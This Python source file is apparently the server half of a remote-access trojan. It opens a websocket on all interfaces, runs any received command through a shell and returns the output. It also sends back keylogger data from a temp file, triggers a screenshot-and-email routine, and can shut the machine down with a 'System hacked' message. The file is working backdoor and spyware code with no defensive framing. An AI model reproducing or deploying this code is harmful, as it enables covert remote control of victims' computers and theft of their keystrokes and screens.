import asyncio
import websockets
import subprocess
import os
import json
import screenshot
import platform
import tempfile

def getData():
    if platform.system().lower() == "linux":
    	path=tempfile.gettempdir()+"/log.sys"
    if platform.system().lower() == "windows":
    	path=tempfile.gettempdir() + "\\log.sys"
    f = open(path);
    rd = f.read()
    f.close()
    return rd

async def time(websocket, path):
    while True:
        data = await websocket.recv()
        standardOutput = "Command Line Output"
        standardError = "Command Line Error output"
        if data == '__shutdownSystem':
            if platform.system().lower() == 'windows':
                cmd = subprocess.Popen("shutdown -s -t 10",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                exit()
            if platform.system().lower() == 'linux':
                cmd = subprocess.Popen("poweroff",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                cmd = subprocess.Popen("shutdown -h +1 'System hacked ... Shutting down'",shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                exit()
                ###########################################
        if data == '__screenshotEmail':
            await websocket.send(screenshot.screeshotEmail())
        elif data == '__getLog':
            response = {"status":"Key log data in modal","stdout":standardOutput,"stderr":standardError,"dir":str(os.getcwd()),"logData":getData(),"systemInfo":platform.platform()}
            response = json.dumps(response)
            await websocket.send(response)
        elif data[:2] == 'cd':
            os.chdir(data[3:])
            response = {"status":"dir changed","stdout":standardOutput,"stderr":standardError,"dir":str(os.getcwd()),"logData":"&eogon;","systemInfo":platform.platform()}
            response = json.dumps(response)
            await websocket.send(response)
        else :
            cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            standardOutput = str(cmd.stdout.read(),"utf-8")
            standardError = str(cmd.stderr.read(),"utf-8")
            status = "OK"
            response = {"status":status,"stdout":standardOutput,"stderr":standardError,"dir":str(os.getcwd()),"logData":"&eogon;","systemInfo":platform.platform()}
            response = json.dumps(response)
            await websocket.send(response)
            ##################################################
        # output_bytes = cmd.stdout.read() + cmd.stderr.read()
        # output_str = str(os.getcwd()) + '>' + str(output_bytes, "utf-8")
        # await websocket.send(output_str)
        # standardOutput = str(cmd.stdout.read(),"utf-8")
        # standardError = str(cmd.stderr.read(),"utf-8")


if __name__ == '__main__':
    start_server = websockets.serve(time, '0.0.0.0', 5678)
    asyncio.get_event_loop().run_until_complete(start_server)
    asyncio.get_event_loop().run_forever()

